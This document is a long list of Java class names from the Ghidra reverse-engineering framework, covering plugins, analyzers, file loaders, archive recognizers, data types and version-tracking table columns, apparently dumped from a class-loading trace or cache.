ghidra.app.plugin.core.string.StringTableModel$StringTypeTableColumn
ghidra.app.plugin.core.string.StringTableModel$StringViewTableColumn
ghidra.app.plugin.core.string.StringTablePlugin
ghidra.app.plugin.core.string.StringsAnalyzer
ghidra.app.plugin.core.string.StringsAnalyzer$Alignment
ghidra.app.plugin.core.string.StringsAnalyzer$Alignment[]
ghidra.app.plugin.core.string.StringsAnalyzer$MinStringLen
ghidra.app.plugin.core.string.StringsAnalyzer$MinStringLen[]
ghidra.app.plugin.core.string.translate.TranslateStringsPlugin
ghidra.app.plugin.core.strings.DoesNotHaveTranslationValueColumnConstraint
ghidra.app.plugin.core.strings.HasEncodingErrorColumnConstraint
ghidra.app.plugin.core.strings.HasTranslationValueColumnConstraint
ghidra.app.plugin.core.strings.IsAsciiColumnConstraint
ghidra.app.plugin.core.strings.IsNotAsciiColumnConstraint
ghidra.app.plugin.core.strings.StringDataInstanceColumnConstraint
ghidra.app.plugin.core.strings.StringDataInstanceColumnTypeMapper
ghidra.app.plugin.core.strings.ViewStringsColumnConstraintProvider
ghidra.app.plugin.core.strings.ViewStringsPlugin
ghidra.app.plugin.core.symboltree.SymbolTreePlugin
ghidra.app.plugin.core.symtable.SymbolReferenceModel$AccessTableColumn
ghidra.app.plugin.core.symtable.SymbolReferenceModel$SubroutineTableColumn
ghidra.app.plugin.core.symtable.SymbolRowObjectToAddressTableRowMapper
ghidra.app.plugin.core.symtable.SymbolRowObjectToProgramLocationTableRowMapper
ghidra.app.plugin.core.symtable.SymbolTableModel$DataTypeTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$LocationTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$NameTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$NamespaceTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$OffcutReferenceCountTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$PinnedTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$ReferenceCountTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$SourceTableColumn
ghidra.app.plugin.core.symtable.SymbolTableModel$UserTableColumn
ghidra.app.plugin.core.symtable.SymbolTablePlugin
ghidra.app.plugin.core.table.TableServicePlugin
ghidra.app.plugin.core.totd.TipOfTheDayDialog
ghidra.app.plugin.core.totd.TipOfTheDayDialog$1
ghidra.app.plugin.core.totd.TipOfTheDayDialog$2
ghidra.app.plugin.core.totd.TipOfTheDayDialog$3
ghidra.app.plugin.core.totd.TipOfTheDayPlugin
ghidra.app.plugin.core.totd.TipOfTheDayPlugin$$Lambda$377.2082104352
ghidra.app.plugin.core.totd.TipOfTheDayPlugin$1
ghidra.app.plugin.core.validator.ValidateProgramPlugin
ghidra.app.plugin.debug.DbViewerPlugin
ghidra.app.plugin.debug.DomainEventDisplayPlugin
ghidra.app.plugin.debug.DomainFolderChangesDisplayPlugin
ghidra.app.plugin.debug.EventDisplayPlugin
ghidra.app.plugin.debug.GenerateOldLanguagePlugin
ghidra.app.plugin.debug.GenerateOldLanguagePlugin$DummyLanguageTranslator
ghidra.app.plugin.debug.JavaHelpPlugin
ghidra.app.plugin.debug.MemoryUsagePlugin
ghidra.app.plugin.debug.MemoryUsagePlugin$1
ghidra.app.plugin.debug.propertymanager.PropertyManagerPlugin
ghidra.app.plugin.exceptionhandlers.gcc.GccExceptionAnalyzer
ghidra.app.plugin.exceptionhandlers.gcc.datatype.AbstractLeb128DataType
ghidra.app.plugin.exceptionhandlers.gcc.datatype.DwarfEncodingModeDataType
ghidra.app.plugin.exceptionhandlers.gcc.datatype.PcRelative31AddressDataType
ghidra.app.plugin.exceptionhandlers.gcc.datatype.SignedLeb128DataType
ghidra.app.plugin.exceptionhandlers.gcc.datatype.UnsignedLeb128DataType
ghidra.app.plugin.gui.LookAndFeelPlugin
ghidra.app.plugin.processors.generic.PcodeFieldFactory
ghidra.app.plugin.processors.sleigh.SleighLanguageProvider
ghidra.app.plugin.processors.sleigh.SleighLanguageValidator
ghidra.app.plugin.prototype.MicrosoftCodeAnalyzerPlugin.PEExceptionAnalyzer
ghidra.app.plugin.prototype.MicrosoftCodeAnalyzerPlugin.PropagateExternalParametersAnalyzer
ghidra.app.plugin.prototype.MicrosoftCodeAnalyzerPlugin.RttiAnalyzer
ghidra.app.plugin.prototype.MicrosoftCodeAnalyzerPlugin.WindowsResourceReferenceAnalyzer
ghidra.app.plugin.prototype.analysis.AggressiveInstructionFinderAnalyzer
ghidra.app.plugin.prototype.analysis.ArmAggressiveInstructionFinderAnalyzer
ghidra.app.plugin.prototype.dataArchiveUtilities.ArchiveConverterPlugin
ghidra.app.plugin.prototype.debug.ScreenshotPlugin
ghidra.app.script.GhidraScriptProvider
ghidra.app.script.JavaScriptClassLoader
ghidra.app.script.JavaScriptProvider
ghidra.app.services.AbstractAnalyzer
ghidra.app.services.Analyzer
ghidra.app.services.BlockModelService
ghidra.app.services.BlockModelServiceListener
ghidra.app.services.BookmarkService
ghidra.app.services.ClipboardService
ghidra.app.services.CodeFormatService
ghidra.app.services.CodeViewerService
ghidra.app.services.DataService
ghidra.app.services.DataTypeManagerService
ghidra.app.services.DataTypeReferenceFinder
ghidra.app.services.DiffService
ghidra.app.services.EclipseIntegrationService
ghidra.app.services.FileImporterService
ghidra.app.services.FileSystemBrowserService
ghidra.app.services.GhidraScriptService
ghidra.app.services.MemorySearchService
ghidra.app.services.NavigationHistoryService
ghidra.app.services.ProgramManager
ghidra.app.services.ProgramTreeService
ghidra.app.services.TextEditorService
ghidra.app.tablechooser.AddressableRowObjectToAddressTableRowMapper
ghidra.app.tablechooser.AddressableRowObjectToFunctionTableRowMapper
ghidra.app.tablechooser.AddressableRowObjectToProgramLocationTableRowMapper
ghidra.app.util.FileOpenDataFlavorHandler
ghidra.app.util.FileOpenDataFlavorHandlerService
ghidra.app.util.GhidraFileOpenDataFlavorHandlerService
ghidra.app.util.OptionValidator
ghidra.app.util.bin.StructConverter
ghidra.app.util.bin.format.coff.relocation.CoffRelocationHandler
ghidra.app.util.bin.format.coff.relocation.X86_32_CoffRelocationHandler
ghidra.app.util.bin.format.coff.relocation.X86_64_CoffRelocationHandler
ghidra.app.util.bin.format.dwarf4.next.DWARFDataTypeImporter$DWARFDataType
ghidra.app.util.bin.format.elf.ElfDynamicType
ghidra.app.util.bin.format.elf.ElfDynamicType$ElfDynamicValueType
ghidra.app.util.bin.format.elf.ElfDynamicType$ElfDynamicValueType[]
ghidra.app.util.bin.format.elf.ElfProgramHeaderType
ghidra.app.util.bin.format.elf.ElfSectionHeaderType
ghidra.app.util.bin.format.elf.extend.AARCH64_ElfExtension
ghidra.app.util.bin.format.elf.extend.ARM_ElfExtension
ghidra.app.util.bin.format.elf.extend.ElfExtension
ghidra.app.util.bin.format.elf.extend.ElfLoadAdapter
ghidra.app.util.bin.format.elf.extend.MIPS_ElfExtension
ghidra.app.util.bin.format.elf.extend.PIC30_ElfExtension
ghidra.app.util.bin.format.elf.extend.PowerPC64_ElfExtension
ghidra.app.util.bin.format.elf.extend.PowerPC_ElfExtension
ghidra.app.util.bin.format.elf.extend.X86_32_ElfExtension
ghidra.app.util.bin.format.elf.relocation.AARCH64_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.ARM_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.AVR32_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.ElfArmRelocationFixupHandler
ghidra.app.util.bin.format.elf.relocation.ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.Elfx86_32bitRelocationFixupHandler
ghidra.app.util.bin.format.elf.relocation.Elfx86_64bitRelocationFixupHandler
ghidra.app.util.bin.format.elf.relocation.MIPS_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.PIC30_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.PowerPC64_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.PowerPC_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.SPARC_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.X86_32_ElfRelocationHandler
ghidra.app.util.bin.format.elf.relocation.X86_64_ElfRelocationHandler
ghidra.app.util.bin.format.pdb.GhidraPdbFactory
ghidra.app.util.bin.format.pdb.PdbFactory
ghidra.app.util.bin.format.pdb.PdbParserNEW$PdbFileType
ghidra.app.util.bin.format.pdb.PdbParserNEW$PdbFileType[]
ghidra.app.util.bin.format.pdb.PdbParserNEW$WrappedDataType
ghidra.app.util.bin.format.pe.OffsetValidator
ghidra.app.util.bin.format.pe.PeMarkupable
ghidra.app.util.bin.format.pe.cli.blobs.CliAbstractSig$CliConstraint
ghidra.app.util.bin.format.pe.cli.blobs.CliAbstractSig$CliElementType
ghidra.app.util.bin.format.pe.cli.blobs.CliAbstractSig$CliElementType[]
ghidra.app.util.bin.format.pe.cli.blobs.CliAbstractSig$CliTypeCodeDataType
ghidra.app.util.bin.format.pe.cli.blobs.CliBlobMarshalSpec$CliNativeTypeDataType
ghidra.app.util.bin.format.pe.cli.tables.CliAbstractTable
ghidra.app.util.bin.format.pe.cli.tables.CliTableGenericParamConstraint
ghidra.app.util.bin.format.pe.rich.MSRichProductBuildNumberDataType
ghidra.app.util.bin.format.pe.rich.MSRichProductIDDataType
ghidra.app.util.bin.format.pe.rich.MSRichProductInfoDataType
ghidra.app.util.bin.format.pe.rich.PERichTableDataType
ghidra.app.util.bin.format.pe.rich.PERichTableDataType$PERichDanSDataType
ghidra.app.util.bin.format.pe.rich.PERichTableDataType$PERichSignatureDataType
ghidra.app.util.bin.format.pe.rich.PERichTableDataType$PERichXorDataType
ghidra.app.util.bin.format.pe.rich.RichObjectCountDataType
ghidra.app.util.bin.format.pe.rich.RichProductIdLoader
ghidra.app.util.bin.format.pe.rich.RichTableRecordDataType
ghidra.app.util.datatype.microsoft.GroupIconResourceDataType
ghidra.app.util.datatype.microsoft.GuidDataType
ghidra.app.util.datatype.microsoft.HTMLResourceDataType
ghidra.app.util.datatype.microsoft.MUIResourceDataType
ghidra.app.util.datatype.microsoft.RTTI0DataType
ghidra.app.util.datatype.microsoft.RTTI1DataType
ghidra.app.util.datatype.microsoft.RTTI2DataType
ghidra.app.util.datatype.microsoft.RTTI3DataType
ghidra.app.util.datatype.microsoft.RTTI4DataType
ghidra.app.util.datatype.microsoft.RTTIDataType
ghidra.app.util.datatype.microsoft.WEVTResourceDataType
ghidra.app.util.demangler.DemangledDataType
ghidra.app.util.demangler.DemangledType
ghidra.app.util.demangler.Demangler
ghidra.app.util.demangler.gnu.GnuDemangler
ghidra.app.util.demangler.microsoft.MicrosoftDemangler
ghidra.app.util.exporter.AsciiExporter
ghidra.app.util.exporter.BinaryExporter
ghidra.app.util.exporter.CppExporter
ghidra.app.util.exporter.Exporter
ghidra.app.util.exporter.GzfExporter
ghidra.app.util.exporter.HtmlExporter
ghidra.app.util.exporter.IntelHexExporter
ghidra.app.util.exporter.ProjectArchiveExporter
ghidra.app.util.exporter.XmlExporter
ghidra.app.util.headless.HeadlessAnalyzer
ghidra.app.util.html.diff.DiffLinesValidator
ghidra.app.util.importer.LibrarySearchPathManager
ghidra.app.util.opinion.AbstractLibrarySupportLoader
ghidra.app.util.opinion.AbstractPeDebugLoader
ghidra.app.util.opinion.AbstractProgramLoader
ghidra.app.util.opinion.BinaryLoader
ghidra.app.util.opinion.CoffLoader
ghidra.app.util.opinion.DbgLoader
ghidra.app.util.opinion.DefLoader
ghidra.app.util.opinion.DexLoader
ghidra.app.util.opinion.ElfDataType
ghidra.app.util.opinion.ElfLoader
ghidra.app.util.opinion.GdtLoader
ghidra.app.util.opinion.GzfLoader
ghidra.app.util.opinion.IntelHexLoader
ghidra.app.util.opinion.JavaLoader
ghidra.app.util.opinion.Loader
ghidra.app.util.opinion.MSCoffLoader
ghidra.app.util.opinion.MachoLoader
ghidra.app.util.opinion.MapLoader
ghidra.app.util.opinion.MotorolaHexLoader
ghidra.app.util.opinion.MzLoader
ghidra.app.util.opinion.NeLoader
ghidra.app.util.opinion.OmfLoader
ghidra.app.util.opinion.PeDataType
ghidra.app.util.opinion.PeLoader
ghidra.app.util.opinion.PefLoader
ghidra.app.util.opinion.XmlLoader
ghidra.app.util.query.TableService
ghidra.app.util.recognizer.AceRecognizer
ghidra.app.util.recognizer.ArjRecognizer
ghidra.app.util.recognizer.Bzip2Recognizer
ghidra.app.util.recognizer.CHMRecognizer
ghidra.app.util.recognizer.CabarcRecognizer
ghidra.app.util.recognizer.CompressiaRecognizer
ghidra.app.util.recognizer.CpioRecognizer
ghidra.app.util.recognizer.CramFSRecognizer
ghidra.app.util.recognizer.DebRecognizer
ghidra.app.util.recognizer.DmgRecognizer
ghidra.app.util.recognizer.EmptyPkzipRecognizer
ghidra.app.util.recognizer.FreezeRecognizer
ghidra.app.util.recognizer.GzipRecognizer
ghidra.app.util.recognizer.ISO9660Recognizer
ghidra.app.util.recognizer.ImpRecognizer
ghidra.app.util.recognizer.JarRecognizer
ghidra.app.util.recognizer.LhaRecognizer
ghidra.app.util.recognizer.MSWIMRecognizer
ghidra.app.util.recognizer.MacromediaFlashRecognizer
ghidra.app.util.recognizer.PakArcRecognizer
ghidra.app.util.recognizer.PkzipRecognizer
ghidra.app.util.recognizer.PpmdRecognizer
ghidra.app.util.recognizer.RPMRecognizer
ghidra.app.util.recognizer.RarRecognizer
ghidra.app.util.recognizer.Recognizer
ghidra.app.util.recognizer.Recognizer[]
ghidra.app.util.recognizer.SbcRecognizer
ghidra.app.util.recognizer.SbxRecognizer
ghidra.app.util.recognizer.SevenZipRecognizer
ghidra.app.util.recognizer.SpannedPkzipRecognizer
ghidra.app.util.recognizer.SqzRecognizer
ghidra.app.util.recognizer.StuffIt1Recognizer
ghidra.app.util.recognizer.StuffIt5Recognizer
ghidra.app.util.recognizer.SzipRecognizer
ghidra.app.util.recognizer.TarRecognizer
ghidra.app.util.recognizer.UharcRecognizer
ghidra.app.util.recognizer.UnixCompressRecognizer
ghidra.app.util.recognizer.UnixPackRecognizer
ghidra.app.util.recognizer.VHDRecognizer
ghidra.app.util.recognizer.XZRecognizer
ghidra.app.util.recognizer.XarRecognizer
ghidra.app.util.recognizer.YbsRecognizer
ghidra.app.util.recognizer.ZlibRecognizer
ghidra.app.util.recognizer.sitxRecognizer
ghidra.app.util.viewer.field.AbstractVariableFieldFactory
ghidra.app.util.viewer.field.AddressAnnotatedStringHandler
ghidra.app.util.viewer.field.AddressFieldFactory
ghidra.app.util.viewer.field.AnnotatedMouseHandler
ghidra.app.util.viewer.field.AnnotatedStringFieldMouseHandler
ghidra.app.util.viewer.field.AnnotatedStringHandler
ghidra.app.util.viewer.field.AnnotatedStringHandler$1
ghidra.app.util.viewer.field.ArrayValuesFieldFactory
ghidra.app.util.viewer.field.AssignedVariableFieldFactory
ghidra.app.util.viewer.field.BytesFieldFactory
ghidra.app.util.viewer.field.CommentFieldMouseHandler
ghidra.app.util.viewer.field.DummyFieldFactory
ghidra.app.util.viewer.field.EolCommentFieldFactory
ghidra.app.util.viewer.field.ErrorFieldMouseHandler
ghidra.app.util.viewer.field.ExecutableTaskStringHandler
ghidra.app.util.viewer.field.FieldFactory
ghidra.app.util.viewer.field.FieldMouseHandler
ghidra.app.util.viewer.field.FieldMouseHandlerExtension
ghidra.app.util.viewer.field.FieldNameFieldFactory
ghidra.app.util.viewer.field.FunctionCallFixupFieldFactory
ghidra.app.util.viewer.field.FunctionPurgeFieldFactory
ghidra.app.util.viewer.field.FunctionRepeatableCommentFieldFactory
ghidra.app.util.viewer.field.FunctionRepeatableCommentFieldMouseHandler
ghidra.app.util.viewer.field.FunctionSignatureFieldFactory
ghidra.app.util.viewer.field.FunctionSignatureSourceFieldFactory
ghidra.app.util.viewer.field.FunctionTagFieldFactory
ghidra.app.util.viewer.field.ImageFactoryFieldMouseHandler
ghidra.app.util.viewer.field.InstructionMaskValueFieldFactory
ghidra.app.util.viewer.field.InvalidAnnotatedStringHandler
ghidra.app.util.viewer.field.LabelFieldFactory
ghidra.app.util.viewer.field.MemoryBlockStartFieldFactory
ghidra.app.util.viewer.field.MnemonicFieldFactory
ghidra.app.util.viewer.field.MnemonicFieldMouseHandler
ghidra.app.util.viewer.field.OpenCloseFieldFactory
ghidra.app.util.viewer.field.OpenCloseFieldMouseHandler
ghidra.app.util.viewer.field.OperandFieldFactory
ghidra.app.util.viewer.field.OperandFieldHelper
ghidra.app.util.viewer.field.OperandFieldMouseHandler
ghidra.app.util.viewer.field.ParallelInstructionFieldFactory
ghidra.app.util.viewer.field.PcodeFieldMouseHandler
ghidra.app.util.viewer.field.PlateFieldFactory
ghidra.app.util.viewer.field.PostCommentFieldFactory
ghidra.app.util.viewer.field.PreCommentFieldFactory
ghidra.app.util.viewer.field.ProgramAnnotatedStringHandler
ghidra.app.util.viewer.field.RegisterFieldFactory
ghidra.app.util.viewer.field.RegisterTransitionFieldFactory
ghidra.app.util.viewer.field.SeparatorFieldFactory
ghidra.app.util.viewer.field.SpaceFieldFactory
ghidra.app.util.viewer.field.SpacerFieldFactory
ghidra.app.util.viewer.field.SubDataFieldFactory
ghidra.app.util.viewer.field.SymbolAnnotatedStringHandler
ghidra.app.util.viewer.field.ThunkedFunctionFieldFactory
ghidra.app.util.viewer.field.ThunkedFunctionFieldMouseHandler
ghidra.app.util.viewer.field.URLAnnotatedStringHandler
ghidra.app.util.viewer.field.VariableCommentFieldFactory
ghidra.app.util.viewer.field.VariableCommentFieldMouseHandler
ghidra.app.util.viewer.field.VariableLocFieldFactory
ghidra.app.util.viewer.field.VariableNameFieldFactory
ghidra.app.util.viewer.field.VariableTypeFieldFactory
ghidra.app.util.viewer.field.VariableXRefFieldFactory
ghidra.app.util.viewer.field.VariableXRefFieldMouseHandler
ghidra.app.util.viewer.field.VariableXRefHeaderFieldFactory
ghidra.app.util.viewer.field.XRefFieldFactory
ghidra.app.util.viewer.field.XRefFieldMouseHandler
ghidra.app.util.viewer.field.XRefHeaderFieldFactory
ghidra.app.util.viewer.format.FieldFormatModel
ghidra.app.util.viewer.format.FieldFormatModel$FieldFactoryComparator
ghidra.app.util.viewer.format.FormatModelListener
ghidra.app.util.viewer.listingpanel.ListingCodeComparisonPanel
ghidra.app.util.viewer.listingpanel.ListingDiffChangeListener
ghidra.app.util.viewer.listingpanel.MarginProvider
ghidra.app.util.viewer.listingpanel.ProgramLocationListener
ghidra.app.util.viewer.listingpanel.ProgramSelectionListener
ghidra.app.util.viewer.util.CodeComparisonPanel
ghidra.base.help.GhidraHelpService
ghidra.base.widgets.table.constraint.provider.AddressBasedLocationColumnTypeMapper
ghidra.base.widgets.table.constraint.provider.DataTypeColumnTypeMapper
ghidra.base.widgets.table.constraint.provider.NamespaceColumnTypeMapper
ghidra.base.widgets.table.constraint.provider.ProgramColumnConstraintProvider
ghidra.base.widgets.table.constraint.provider.ProgramColumnConstraintProvider$AddressColumnConstraint
ghidra.base.widgets.table.constraint.provider.ProgramLocationColumnTypeMapper
ghidra.base.widgets.table.constraint.provider.SymbolColumnTypeMapper
ghidra.bitpatterns.gui.ByteSequenceTableModel$ByteSequenceNumOccurrencesTableColumn
ghidra.bitpatterns.gui.ByteSequenceTableModel$ByteSequencePercentageTableColumn
ghidra.bitpatterns.gui.ByteSequenceTableModel$ByteSequenceTableColumn
ghidra.bitpatterns.gui.ClosedPatternTableModel$ClosedPatternFixedBitsTableColumn
ghidra.bitpatterns.gui.ClosedPatternTableModel$ClosedPatternNumOccurrencesTableColumn
ghidra.bitpatterns.gui.ClosedPatternTableModel$ClosedPatternPercentageTableColumn
ghidra.bitpatterns.gui.ClosedPatternTableModel$ClosedPatternTableColumn
ghidra.bitpatterns.gui.DisassembledByteSequenceTableModel$ByteSequenceDisassemblyTableColumn
ghidra.bitpatterns.gui.FunctionBitPatternsExplorerPlugin
ghidra.bitpatterns.gui.PatternEvalTabelModel$AddressTableColumn
ghidra.bitpatterns.gui.PatternEvalTabelModel$MatchTypeTableColumn
ghidra.bitpatterns.gui.PatternEvalTabelModel$PatternStringTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$AlignmentTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$BitsOfCheckTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$ContextRegisterFilterTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$DittedBitSequenceTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$NoteTableColumn
ghidra.bitpatterns.gui.PatternInfoTableModel$PatternTypeTableColumn
ghidra.docking.settings.BooleanSettingsDefinition
ghidra.docking.settings.EnumSettingsDefinition
ghidra.docking.settings.FloatingPointPrecisionSettingsDefinition
ghidra.docking.settings.FormatSettingsDefinition
ghidra.docking.settings.IntegerSignednessFormattingModeSettingsDefinition
ghidra.docking.settings.JavaEnumSettingsDefinition
ghidra.docking.settings.Settings
ghidra.docking.settings.SettingsDefinition
ghidra.docking.settings.SettingsDefinition[]
ghidra.docking.settings.SettingsImpl
ghidra.docking.settings.SettingsImpl$1
ghidra.docking.settings.Settings[]
ghidra.docking.util.DockingWindowsLookAndFeelUtils
ghidra.docking.util.DockingWindowsLookAndFeelUtils$$Lambda$133.1748562065
ghidra.docking.util.DockingWindowsLookAndFeelUtils$$Lambda$238.870722871
ghidra.feature.fid.analyzer.FidAnalyzer
ghidra.feature.fid.hash.X86InstructionSkipper
ghidra.feature.fid.plugin.FidDebugPlugin
ghidra.feature.fid.plugin.FidPlugin
ghidra.feature.fid.plugin.FidPluginPackage
ghidra.feature.vt.api.correlator.address.ExactMatchAddressCorrelator
ghidra.feature.vt.api.correlator.address.LastResortAddressCorrelator
ghidra.feature.vt.api.correlator.program.CombinedFunctionAndDataReferenceProgramCorrelator
ghidra.feature.vt.api.correlator.program.CombinedFunctionAndDataReferenceProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.DataMatchProgramCorrelator
ghidra.feature.vt.api.correlator.program.DataReferenceProgramCorrelator
ghidra.feature.vt.api.correlator.program.DataReferenceProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.DuplicateDataMatchProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.DuplicateFunctionMatchProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.DuplicateSymbolNameProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.ExactDataMatchProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.ExactMatchBytesProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.ExactMatchInstructionsProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.ExactMatchMnemonicsProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.FunctionMatchProgramCorrelator
ghidra.feature.vt.api.correlator.program.FunctionReferenceProgramCorrelator
ghidra.feature.vt.api.correlator.program.FunctionReferenceProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.ImpliedMatchProgramCorrelator
ghidra.feature.vt.api.correlator.program.ManualMatchProgramCorrelator
ghidra.feature.vt.api.correlator.program.SimilarDataProgramCorrelator
ghidra.feature.vt.api.correlator.program.SimilarDataProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.SimilarSymbolNameProgramCorrelator
ghidra.feature.vt.api.correlator.program.SimilarSymbolNameProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.SymbolNameProgramCorrelator
ghidra.feature.vt.api.correlator.program.SymbolNameProgramCorrelatorFactory
ghidra.feature.vt.api.correlator.program.VTAbstractReferenceProgramCorrelator
ghidra.feature.vt.api.correlator.program.VTAbstractReferenceProgramCorrelator$1
ghidra.feature.vt.api.correlator.program.VTAbstractReferenceProgramCorrelatorFactory
ghidra.feature.vt.api.impl.VTSessionContentHandler
ghidra.feature.vt.api.main.VTProgramCorrelator
ghidra.feature.vt.api.main.VTProgramCorrelatorFactory
ghidra.feature.vt.api.main.VTScore
ghidra.feature.vt.api.main.VTScore$$Lambda$263.272183462
ghidra.feature.vt.api.main.VTSession
ghidra.feature.vt.api.stringable.DataTypeStringable
ghidra.feature.vt.api.stringable.FunctionNameStringable
ghidra.feature.vt.api.stringable.FunctionSignatureStringable
ghidra.feature.vt.api.stringable.MultipleSymbolStringable
ghidra.feature.vt.api.stringable.StringStringable
ghidra.feature.vt.api.stringable.SymbolStringable
ghidra.feature.vt.api.stringable.deprecated.LocalVariableStringable
ghidra.feature.vt.api.stringable.deprecated.MultipleLocalVariableStringable
ghidra.feature.vt.api.stringable.deprecated.MultipleParameterStringable
ghidra.feature.vt.api.stringable.deprecated.ParameterStringable
ghidra.feature.vt.api.util.Stringable
ghidra.feature.vt.api.util.VTAbstractProgramCorrelator
ghidra.feature.vt.api.util.VTAbstractProgramCorrelatorFactory
ghidra.feature.vt.gui.plugin.VTPlugin
ghidra.feature.vt.gui.plugin.VTPlugin$1
ghidra.feature.vt.gui.plugin.VersionTrackingPluginPackage
ghidra.feature.vt.gui.provider.functionassociation.FunctionRowObjectToAddressTableRowMapper
ghidra.feature.vt.gui.provider.functionassociation.FunctionRowObjectToFunctionTableRowMapper
ghidra.feature.vt.gui.provider.functionassociation.FunctionRowObjectToProgramLocationTableRowMapper
ghidra.feature.vt.gui.provider.impliedmatches.ImpliedMatchWrapperToVTMatchTableRowMapper
ghidra.feature.vt.gui.provider.impliedmatches.VTImpliedMatchesTableModel$DestinationReferenceAddressTableColumn
ghidra.feature.vt.gui.provider.impliedmatches.VTImpliedMatchesTableModel$SourceReferenceAddressTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$AppliedDestinationAddressTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$AppliedDestinationSourceTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$DestinationValueTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$IsInDBTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$MarkupTypeTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$OriginalDestinationValueTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$RelativeDisplacementTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$SourceAddressTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$SourceValueTableColumn
ghidra.feature.vt.gui.provider.markuptable.VTMarkupItemsTableModel$StatusTableColumn
ghidra.feature.vt.gui.provider.relatedMatches.VTRelatedMatchTableModel$CorrelationTableColumn
ghidra.feature.vt.gui.provider.relatedMatches.VTRelatedMatchTableModel$DestinationAddressTableColumn
ghidra.feature.vt.gui.provider.relatedMatches.VTRelatedMatchTableModel$DestinationFunctionTableColumn
ghidra.feature.vt.gui.provider.relatedMatches.VTRelatedMatchTableModel$SourceAddressTableColumn
ghidra.feature.vt.gui.provider.relatedMatches.VTRelatedMatchTableModel$SourceFunctionTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$AlgorithmTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$AppliedMarkupStatusBatteryTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$AppliedMarkupStatusTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$ConfidenceScoreTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$DestinationAddressTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$DestinationLabelSourceTypeTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$DestinationLabelTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$DestinationLengthTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$DestinationNamespaceTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$LengthDeltaTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$MatchTypeTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$MultipleDestinationLabelsTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$MultipleSourceLabelsTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$ScoreTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SessionNumberTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SourceAddressTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SourceLabelSourceTypeTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SourceLabelTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SourceLengthTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$SourceNamespaceTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$StatusTableColumn
ghidra.feature.vt.gui.util.AbstractVTMatchTableModel$TagTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToAddressTableRowMapper
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToAddressTableRowMapper$VTMarkupItemDestinationWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToAddressTableRowMapper$VTMarkupItemDestinationWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToProgramLocationTableRowMapper
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToProgramLocationTableRowMapper$VTMarkupItemDestinationWrappedMappedProgramLocationTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemDestinationAddressToProgramLocationTableRowMapper$VTMarkupItemDestinationWrappedMappedTableColumn
ghidra.feature.vt.gui.util.VTMarkupItemSourceAddressToAddressTableRowMapper
